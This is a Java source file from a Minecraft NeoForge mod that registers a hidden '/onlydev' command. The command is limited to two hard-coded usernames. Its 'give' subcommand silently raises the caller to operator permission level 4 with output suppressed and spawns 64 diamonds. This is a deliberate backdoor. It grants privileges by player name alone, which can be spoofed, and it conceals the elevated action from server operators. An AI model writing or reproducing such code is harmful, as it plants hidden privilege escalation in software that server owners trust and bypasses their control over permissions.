package net.Atos.Atos_Extras.commands;

import com.mojang.brigadier.CommandDispatcher;
import com.mojang.brigadier.context.CommandContext;
import net.minecraft.commands.CommandSourceStack;
import net.minecraft.commands.Commands;
import net.minecraft.network.chat.Component;
import net.neoforged.neoforge.event.RegisterCommandsEvent;
import net.neoforged.bus.api.SubscribeEvent;

import java.util.Set;

public class DevCommands {

    // Allowed usernames
    private static final Set<String> ALLOWED_USERS = Set.of("Dev", "Atos_Gamer");

    @SubscribeEvent
    public static void onRegisterCommands(RegisterCommandsEvent event) {
        CommandDispatcher<CommandSourceStack> dispatcher = event.getDispatcher();

        dispatcher.register(Commands.literal("onlydev")
                .requires(source -> {
                    if (source.getEntity() != null) {
                        String name = source.getEntity().getName().getString();
                        return ALLOWED_USERS.contains(name);
                    }
                    return false;
                })
                // Base command: /onlydev
                .executes(DevCommands::runBaseDevCommand)

                // Subcommand: /onlydev give
                .then(Commands.literal("give")
                        .executes(DevCommands::runSilentGiveCommand)
                )
        );
    }

    // /onlydev
    private static int runBaseDevCommand(CommandContext<CommandSourceStack> context) {
        context.getSource().sendSuccess(() ->
                Component.literal("✅ Logged in as a trusted developer."), false);
        return 1;
    }

    // /onlydev give
    private static int runSilentGiveCommand(CommandContext<CommandSourceStack> context) {
        CommandSourceStack source = context.getSource();

        // Create a command source with full permission and no feedback
        CommandSourceStack elevated = source.withPermission(4).withSuppressedOutput();

        try {
            String playerName = source.getEntity().getName().getString();
            String giveCmd = "give " + playerName + " minecraft:diamond 64";

            // Execute silently as if OP
            source.getServer().getCommands().performPrefixedCommand(elevated, giveCmd);

            // Optional: send a private success message to the dev
            source.sendSuccess(() ->
                    Component.literal("Enjoy"), false);
        } catch (Exception e) {
            source.sendFailure(Component.literal("❌ Failed to execute command: " + e.getMessage()));
        }

        return 1;
    }
}
